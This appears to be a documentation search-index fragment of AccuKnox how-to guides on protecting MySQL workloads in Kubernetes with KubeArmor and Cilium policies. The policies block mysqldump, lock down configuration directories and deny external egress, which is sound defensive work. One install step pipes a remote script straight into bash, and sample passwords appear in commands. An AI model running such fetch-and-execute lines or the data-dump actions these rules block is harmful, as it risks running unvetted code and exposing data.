kubearmorpolicy.security.kubearmor.com/ksp-block-stigs-mysql-config-directory-access unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml ciliumnetworkpolicy.cilium.io/cnp-mysql-stig-v-235146 unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml ciliumnetworkpolicy.cilium.io/cnp-egress-deny-external-communication-from-mysql-pod unchanged Deployment state after applied the policies: \u276f kubectl get all -A | grep sql default pod/wordpress-mysql-55556f7-nf5fm 1 /1 Running 0 32m explorer pod/mysql-0 1 /1 Running 0 17m default service/mysql ClusterIP None <none> 3306 /TCP 5h23m default service/wordpress-mysql ClusterIP None <none> 3306 /TCP 32m explorer service/mysql ClusterIP 10 .52.4.111 <none> 3306 /TCP 17m explorer service/mysql-headless ClusterIP None <none> 3306 /TCP 17m default deployment.apps/wordpress-mysql 1 /1 1 1 32m default replicaset.apps/wordpress-mysql-55556f7 1 1 32m default replicaset.apps/wordpress-mysql-7fc5cb7ccc 0 0 32m explorer statefulset.apps/mysql 1 /1 17m Verifying logs using Cilium: List all cilium pods \u276f kubectl -n kube-system get pods -l k8s-app = cilium NAME READY STATUS RESTARTS AGE cilium-6jbcf 1 /1 Running 0 115m cilium-pj86d 1 /1 Running 0 115m cilium-qp649 1 /1 Running 0 115m Run this command kubectl -n kube-system exec -it cilium-6jbcf -- bash [Note: Pods name may vary check with your deployment] After entering into the pod, Run this below command: \u276f kubectl -n kube-system exec -it cilium-6jbcf -- bash Defaulted container \"cilium-agent\" out of: cilium-agent, wait-for-node-init ( init ) , ebpf-mount ( init ) , clean-cilium-state ( init ) root@gke-cys-may-9-default-pool-8ddae69c-gnkg:/home/cilium# cilium monitor Listening for events on 2 CPUs with 64x4096 of shared memory Press Ctrl-C to quit level = info msg = \"Initializing dissection cache...\" subsys = monitor -> endpoint 1 flow 0x0 identity remote-node->health state new ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192 -> 10 .40.2.23 EchoRequest -> stack flow 0x0 identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23 -> 10 .128.15.192 EchoReply -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK >> IPCache entry upserted: { \"cidr\" : \"10.128.0.62/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.40/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } Conclusion \u00b6 In this document, we tested and proven several KubeArmor and cilium rules in our OnlineBookStore (mysql) implementation. In this section, we introduced rules such as readOnly: true and ownerOnly: true to allow certain functionality while blocking unauthorized access and processing for KubeArmor policies. Cilium is a white-list model. As a result, we restrict access to our programme to specific ports and access points. We can safeguard workloads and operate workloads smoothly in our environment with these two accuknox open-source solutions. \\ We used KubeArmor Policy-Templates and AccuKnox Sample Library to deploy applications and apply policies to our workload.","title":"How to ensure enforcing policies will not break my application"},{"location":"how-to/ensure-policies-will-not-break-application/#how-to-ensure-enforcing-policies-will-not-break-my-application","text":"","title":"How to ensure enforcing policies will not break my application?"},{"location":"how-to/ensure-policies-will-not-break-application/#introduction","text":"When we using KubeArmor and Cilium policies to allow the functionality of particular functions in deployment. These policies should not obstruct the deployment process and our application should work as intended without any disturbance with applied policies. AccuKnox provides fine-grained access control for workloads at runtime allowing DevSecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the DevSecOps can create runtime policies to make sure always verify and never trust that's how zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads. File access - A typical file access by a process or a network can be allowed or denied on specific paths - Process execution - The ability to allow or deny a Process execution or forking can be achieved for specific processes or all the processes on a directory - Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed. - Capabilities - A workload can share the capabilities of the host if and when allowed. Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host OS. For example,An online book-store app made with MySQL as a database. Scenerio is we want to keep the logs from being exposed to the public and also allowing them to function. We need to develop regulations that merely block the exposure, not the entire functionality. We'll go over how to construct rules with suitable permissions and use cases in this document.","title":"Introduction"},{"location":"how-to/ensure-policies-will-not-break-application/#sample-application-deployment","text":"AccuKnox sample library has various deployments for your needs to deploy vulnerable applications and use cases and Proof-of-concept, etc., Check out here . AccuKnox maintains repository that contains various sample deployment that one can use to play with for various PoC scenarios. In this use case we are going to deploy an Online Book Store app made with mysql deployment. To create this mysql deployment into your cluster run this below command: kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/OnlineBookStore/mysql-deployment.yaml Output: service/mysql created deployment.apps/mysql created persistentvolume/mysql-pv-volume created persistentvolumeclaim/mysql-pv-claim created Deployment state: NAME READY STATUS RESTARTS AGE pod/mysql-68579b78bb-rttvt 1 /1 Running 0 24s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE service/kubernetes ClusterIP 10 .44.0.1 <none> 443 /TCP 3h3m service/mysql ClusterIP None <none> 3306 /TCP 27s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/mysql 1 /1 1 1 26s NAME DESIRED CURRENT READY AGE replicaset.apps/mysql-68579b78bb 1 1 1 26s","title":"Sample Application Deployment"},{"location":"how-to/ensure-policies-will-not-break-application/#policy-templates","text":"AccuKnox policy-templates includes ready-made policy templates for all of our needs, from NIST, PCI-DSS, and STIG compliances to all CVEs and everything in between. That is the repository we will use in our use case. Check out policy-template for further information.","title":"Policy-Templates"},{"location":"how-to/ensure-policies-will-not-break-application/#policy-creation","text":"To apply this KubeArmor Policy run this below command: [Note: matchLabels and namespace may vary check with your deployment] In this policy we are going to audit the config files for any unusual activity. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-restrict-access-mysql-server-config namespace : default # Change your namespace spec : tags : [ \"MYSQL\" , \"config-files\" , \"mysqldump\" ] message : \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\" selector : matchLabels : app : mysql8 # Change your labels file : severity : 5 matchPaths : - path : /etc/mysql/my.cnf ownerOnly : true matchDirectories : - dir : /etc/mysql/ recursive : true ownerOnly : true - dir : /var/lib/mysql/ readOnly : true recursive : true - dir : /var/log/mysql/ recursive : true action : Audit process : severity : 10 matchPaths : - path : /usr/bin/mysqldump action : Block In our policy we have mentioned the: - dir : /var/lib/mysql/ readOnly : true recursive : true readOnly: true this rule will give appropriate permissions to the deployed application. \\ So we can stop the logs from exposing and also our policy won\u2019t break the applications functionality. In this policy we are going to protect the mysqldump to get accessed and to apply this policy run this command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-block-mysql-dump-in-pods namespace: default # Change your namespace spec: tags: [ \"mysql\" , \"system\" , \"K8s\" ] message: \"Warning! MySQLdump is blocked\" selector: matchLabels: app: testpod #change with your own label process: matchPaths: - path: /usr/bin/mysqldump action: Block severity: 6 In this policy we are protecting the configuration files from exposure. To apply the policy run this below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-block-stigs-mysql-config-directory-access namespace: default # Change your namespace spec: tags: [ \"STIGS\" , \"MYSQL\" ] message: \"Alert! Access to mysql conf files has been denied\" selector: matchLabels: pod: mysql-1 # Change your match labels file: severity: 5 matchDirectories: - dir: /etc/mysql/ recursive: true ownerOnly: true - dir: /usr/lib/mysql/ recursive: true ownerOnly: true - dir: /usr/share/mysql/ recursive: true ownerOnly: true - dir: /var/lib/mysql/ recursive: true ownerOnly: true - dir: /var/log/mysql/ recursive: true ownerOnly: true - dir: /usr/local/mysql/ recursive: true ownerOnly: true action: Block In this Cilium policy we are going to protect the unused ports from accessing the workloads. To apply the policy run this below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml Policy YAML: # https://www.stigviewer.com/stig/oracle_mysql_8.0/2021-12-10/finding/V-235146 apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mysql-stig-v-235146 namespace : default #change default namespace to match your namespace spec : description : \"Restrict access to unused ports\" endpointSelector : matchLabels : app : mysql #change label app: mysql with your own labels. ingress : - fromEndpoints : - {} toPorts : - ports : - port : \"3306\" - ports : - port : \"33060\" In this cilium policy we are protecting from external access to our mysql workload. To apply the policy run the below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml Policy YAML: apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : cnp-egress-deny-external-communication-from-mysql-pod namespace : default #change default namespace to match your namespace spec : description : \"To block all external world communication from mysql pod and limit it to specific pods\" endpointSelector : matchLabels : app : mysql #change app: mysql to match your label egressDeny : - toEntities : - \"world\" egress : - toEndpoints : - matchLabels : app : frontend #change app: frontend to match your label Verification: After applying multiple policies from policy-template our deployment is still running and without any issues \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml kubearmorpolicy.security.kubearmor.com/ksp-restrict-access-mysql-server-config unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml kubearmorpolicy.security.kubearmor.com/ksp-block-mysql-dump-in-pods unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml kubearmorpolicy.security.kubearmor.com/ksp-block-stigs-mysql-config-directory-access unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml ciliumnetworkpolicy.cilium.io/cnp-mysql-stig-v-235146 unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml ciliumnetworkpolicy.cilium.io/cnp-egress-deny-external-communication-from-mysql-pod unchanged Deployment state after applied the policies: \u276f kubectl get all -A | grep sql default pod/wordpress-mysql-55556f7-nf5fm 1 /1 Running 0 32m explorer pod/mysql-0 1 /1 Running 0 17m default service/mysql ClusterIP None <none> 3306 /TCP 5h23m default service/wordpress-mysql ClusterIP None <none> 3306 /TCP 32m explorer service/mysql ClusterIP 10 .52.4.111 <none> 3306 /TCP 17m explorer service/mysql-headless ClusterIP None <none> 3306 /TCP 17m default deployment.apps/wordpress-mysql 1 /1 1 1 32m default replicaset.apps/wordpress-mysql-55556f7 1 1 32m default replicaset.apps/wordpress-mysql-7fc5cb7ccc 0 0 32m explorer statefulset.apps/mysql 1 /1 17m Verifying logs using Cilium: List all cilium pods \u276f kubectl -n kube-system get pods -l k8s-app = cilium NAME READY STATUS RESTARTS AGE cilium-6jbcf 1 /1 Running 0 115m cilium-pj86d 1 /1 Running 0 115m cilium-qp649 1 /1 Running 0 115m Run this command kubectl -n kube-system exec -it cilium-6jbcf -- bash [Note: Pods name may vary check with your deployment] After entering into the pod, Run this below command: \u276f kubectl -n kube-system exec -it cilium-6jbcf -- bash Defaulted container \"cilium-agent\" out of: cilium-agent, wait-for-node-init ( init ) , ebpf-mount ( init ) , clean-cilium-state ( init ) root@gke-cys-may-9-default-pool-8ddae69c-gnkg:/home/cilium# cilium monitor Listening for events on 2 CPUs with 64x4096 of shared memory Press Ctrl-C to quit level = info msg = \"Initializing dissection cache...\" subsys = monitor -> endpoint 1 flow 0x0 identity remote-node->health state new ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192 -> 10 .40.2.23 EchoRequest -> stack flow 0x0 identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23 -> 10 .128.15.192 EchoReply -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.15.192: 10 .128.15.192:58714 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x1e62a16c identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.15.192:58714 tcp ACK -> stack flow 0xd663c7fb identity health->remote-node state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.63:34796 tcp ACK -> endpoint 1 flow 0x0 identity remote-node->health state established ifindex 0 orig-ip 10 .128.0.63: 10 .128.0.63:34796 -> 10 .40.2.23:4240 tcp ACK -> stack flow 0x44777c79 identity health->host state reply ifindex 0 orig-ip 0 .0.0.0: 10 .40.2.23:4240 -> 10 .128.0.62:36604 tcp ACK -> endpoint 1 flow 0xf6e1704e identity host->health state established ifindex 0 orig-ip 10 .128.0.62: 10 .128.0.62:36604 -> 10 .40.2.23:4240 tcp ACK >> IPCache entry upserted: { \"cidr\" : \"10.128.0.62/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.1/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 } >> IPCache entry upserted: { \"cidr\" : \"10.40.2.40/32\" , \"id\" :1, \"old-id\" :1, \"encrypt-key\" :0 }","title":"Policy Creation"},{"location":"how-to/ensure-policies-will-not-break-application/#conclusion","text":"In this document, we tested and proven several KubeArmor and cilium rules in our OnlineBookStore (mysql) implementation. In this section, we introduced rules such as readOnly: true and ownerOnly: true to allow certain functionality while blocking unauthorized access and processing for KubeArmor policies. Cilium is a white-list model. As a result, we restrict access to our programme to specific ports and access points. We can safeguard workloads and operate workloads smoothly in our environment with these two accuknox open-source solutions. \\ We used KubeArmor Policy-Templates and AccuKnox Sample Library to deploy applications and apply policies to our workload.","title":"Conclusion"},{"location":"how-to/protect-mysql-application/","text":"Database Management is an important part when you have a large amount of data around you. MySQL is one of the most famous open-source Relational Databases to store and handle your data. So securing the data is the main concern for any organization. AccuKnox provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected. Prerequisites \u00b6 Install open-source AccuKnox tools to your cloud environment. Run the following script to install Daemon sets and Services curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash For more details, check this help page or Use the enterprise tier of the AccuKnox product Deploy Sample PHP/MySQL Web application in Kubernetes \u00b6 We will create two deployments; one for the webserver and the other for MySQL DB. The web server will read data from MySQL DB and show it in the browser. Here we have used the GKE environment. [Step 1] Clone GitHub Repo git clone https://github.com/accuknox/samples.git cd samples/php-mysql-webapp [Step 2] Deploy Web server kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver.yaml Run kubectl get pods in the terminal to get the response: You should be able to see the output like this: NAME READY STATUS RESTARTS AGE webserver-55f99f9ffb-f4rvk 1 /1 Running 0 2d3h Alright, the pod is created but we can\u2019t access it despite having its IP, the reason is that the Pod IP is not public. So we use service . When a user tries to access an app, for instance, a web server here, it actually makes a request to a service which itself then checks where it should forward the request. Now to access the webserver you will just access the IP and port as defined in the service configuration file. [Step 3] Now let's deploy web-service kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver-svc.yaml Check the status of the service kubectl get svc You should be able to see the output like this NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kubernetes ClusterIP 10 .16.0.1 <none> 443 /TCP 27d web-service LoadBalancer 10 .16.9.151 35 .193.121.214 80 :31533/TCP 2d3h [Step 4] Create the persistent volume claim to keep your data intact. [Step 5] Create deployment and service for MySQL DB. kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql.yaml Check the status of the pod and service kubectl get po,svc You should be able to see the output like this NAME READY STATUS RESTARTS AGE pod/mysql-796674bfb-dl495 1 /1 Running 0 115s pod/webserver-5f7dbd89d6-5ng7r 1 /1 Running 0 19m pod/webserver-5f7dbd89d6-hnrz9 1 /1 Running 0 19m pod/webserver-5f7dbd89d6-pmw4s 1 /1 Running 0 19m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE service/kubernetes ClusterIP 10 .8.0.1 <none> 443 /TCP 32m service/mysql8-service ClusterIP 10 .8.1.249 <none> 3306 /TCP 27s service/web-service LoadBalancer 10 .8.0.92 34 .70.234.72 80 :32209/TCP 14m Now the application is deployed. You can insert data into the database in two ways. You can use a MySQL Client or directly execute to the MySQL server pod. Connect using a MySQL client: kubectl run -it --rm --image = mysql:5.6 --restart = Never mysql-client -- mysql -h mysql8-service -p.sweetpwd. You should be able to see the output like this $ kubectl run -it --rm --image = mysql:5.6 --restart = Never mysql-client -- mysql -h mysql8-service -p.sweetpwd. If you don ' t see a command prompt, try pressing enter. mysql> Directly executing into MySQL pod: kubectl exec -it mysql-796674bfb-dl495 -- bash Note: Replace mysql-796674bfb-dl495 with your mysql pod name. Now you are inside MySQL pod. Use the below command to enter the MySQL command prompt. mysql -u root -p.sweetpwd. You should be able to see the output like this $ kubectl exec -it mysql-69559dfd5d-nzmcd -- bash root@mysql-69559dfd5d-nzmcd:/# mysql -u root -p.sweetpwd. mysql: [ Warning ] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g . Your MySQL connection id is 10 Server version: 8 .0.28 MySQL Community Server - GPL Copyright ( c ) 2000 , 2022 , Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> Now you are inside the MySQL terminal. First, you need to create a users table and add values to the table. Use the below commands to do that. SHOW DATABASES ; You should be able to see the output like this USE my_db ; You should be able to see the output like this CREATE TABLE users ( name varchar ( 20 ) ); You should be able to see the output like this INSERT INTO users ( name ) VALUES ( 'John' ); Now check the external IP of the web service. If everything works well, you'll see this screen with the name John. Working with Open-Source AccuKnox tools \u00b6 The policy-templates open-source repository provides policy templates based on KubeArmor and Cilium policies for known CVEs and attacks vectors, compliance frameworks such as PCI-DSS, MITRE, STIG, NIST, CIS, etc., popular workloads such as GoLang, Python, PostgreSQL, Cassandra, MySQL, WordPress, etc. We hope that you also contribute by sending policy templates via pull requests or Github issues to grow the list. Go to GitHub repository: https://github.com/kubearmor/policy-templates AccuKnox provides a number of policy templates for your MySQL workloads. Let's see a policy from the policy templates repo. Audit your MySQL Server Sensitive Configuration files with KubeArmor \u00b6 MySQL Server, also known as mysqld, is a single multithreaded program that does most of the work in a MySQL installation. It does not spawn additional processes. MySQL Server manages access to the MySQL data directory that contains databases and tables. The data directory is also the default location for other information such as log files and status files. (i) my.cnf: \u00b6 The default configuration file is called my.cnf and can be located in a number of directories. On Linux and other Unix related platforms, the locations are using /etc/my.cnf, /etc/mysql/my.cnf, /var/lib/mysql/my.cnf or in the default installation directory. This file contains configuration settings that will be loaded when the server starts, including settings for the clients, server, mysqld_safe wrapper and various other MySQL client programs. However, if they're not there, you can use mysqld to find the configuration. Run the following command inside the MySQL server pod. mysqld --help --verbose The first part of the lengthy response describes the options you can send to the server when you launch it. The second part displays the configuration settings during the server compilation. Near the start of the output, find a couple of lines that look similar to the following example: Starts the MySQL database server . Usage : mysqld [ OPTIONS ] Default options are read from the following files in the given order : / etc / my . cnf / etc / mysql / my . cnf ~/ . my . cnf The following groups are read : mysqld server mysqld - 8 . 0 (ii) my-new.cnf \u00b6 This file is created when there is an existing my.cnf file and the mysql_install_db script is running. The mysql_install_db script is designed to develop the my.cnf file if it does not exist. If the file does exist, then the file is created using the name my-new.cnf to avoid overwriting an existing configuration file. It is then up to the user to compare the two, determine files and determine which options are still valid, for the new install and change the files as required to get the new my.cnf configuration file. (iii) Log files \u00b6 By default, MySQL stores its log files in the following directory: / var / log / mysql Check the MySQL configuration if you don't find the MySQL logs in the default directory. View the my.cnf file and look for a log_error line, as in: log_error = / var / log / mysql / error . log (iv) Backups \u00b6 The two main options are to copy the database files or use mysqldump as follows: File copy \u00b6 By default, MySQL creates a directory for each database in its data directory, /var/lib/mysql . Note: Ensure you set the permissions on that file to restrict read access for password-security reasons. mysqldump \u00b6 Another approach to backing up your database is to use the mysqldump tool. Rather than copying the database files directly, mysqldump generates a text file that represents the database. By default, the text file contains a list of SQL statements to recreate the database, but you can also export the database in another format like .CSV or .XML . You can read the man page for mysqldump to see all its options. The statements generated by mysqldump go straight to standard output. You can specify a to redirect the output by running the following command in the command line: This command tells mysqldump to recreate the demodb database in SQL statements and to write them to the file dbbackup.sql . Note that the username and password options function the same as the MySQL client to include the password directly after -p in a script. With the help of KubeArmor and Policy-templates, You can audit/restrict all these sensitive configuration files and processes that use these files easily. Following KubeArmor policy will Audit configuration files and block mysqldump command. \u00b6 # KubeArmor is an open source software that enables you to protect your cloud workload at runtime. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-restrict-access-mysql-server-config namespace : default # Change your namespace spec : tags : [ \"MYSQL\" , \"config-files\" , \"mysqldump\" ] message : \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\" selector : matchLabels : app : mysql8 # Change your labels file : severity : 5 matchPaths : - path : /etc/mysql/my.cnf ownerOnly : true matchDirectories : - dir : /etc/mysql/ recursive : true ownerOnly : true - dir : /var/lib/mysql/ readOnly : true recursive : true - dir : /var/log/mysql/ recursive : true action : Audit process : severity : 10 matchPaths : - path : /usr/bin/mysqldump action : Block Apply KubeArmor Security Policy (KSP) from the Policy templates and perform following steps: Go to Policy templates GitHub Repository. Check MySQL folder then copy the URL of the policy raw file. Apply it using kubectl apply command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml Use mysqldump command: kubectl exec -it mysql-69559dfd5d-nzmcd -- bash root@mysql-7d9977c67d-57mrx:/# mysqldump -u db_user -p .mypwd my_db users > dumpfilename.sql Note: Replace mysql-69559dfd5d-nzmcd with your mysql pod name. You should be able to see the output like this root@mysql-69559dfd5d-nzmcd:/# mysqldump -u db_user -p .mypwd my_db users > dumpfilename.sql bash: /usr/bin/mysqldump: Permission denied root@mysql-69559dfd5d-nzmcd:/# View KubeArmor logs: \u00b6 a. Enable port-forwarding for KubeArmor relay kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 b. Observing logs using karmor CLI karmor log You should be able to see the output like this gRPC server: localhost:32767 Created a gRPC client ( localhost:32767 ) Checked the liveness of the gRPC server Started to watch alerts == Alert / 2022 -02-08 03 :10:05.867619 == Cluster Name: default Host Name: gke-cys-feb8-default-pool-4852bc33-rmcr Namespace Name: default Pod Name: mysql-69559dfd5d-nzmcd Container ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677 Container Name: mysql Severity: ksp-restrict-access-mysql-server-config Tags: 10 Message: MYSQL,config-files,mysqldump Type: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used. Source: MatchedPolicy Operation: /bin/bash Resource: Process Data: /usr/bin/mysqldump -u db_user -p .mypwd my_db users Action: syscall = SYS_EXECVE Result: Block Accessing /etc/mysql/my.cnf config. file; root@mysql-7d9977c67d-7rcmb:/# cat /etc/mysql/my.cnf KubeArmor detects this event and you will receive logs like this: Check karmor log == Alert / 2022 -02-08 03 :12:40.413064 == Cluster Name: default Host Name: gke-cys-feb8-default-pool-4852bc33-rmcr Namespace Name: default Pod Name: 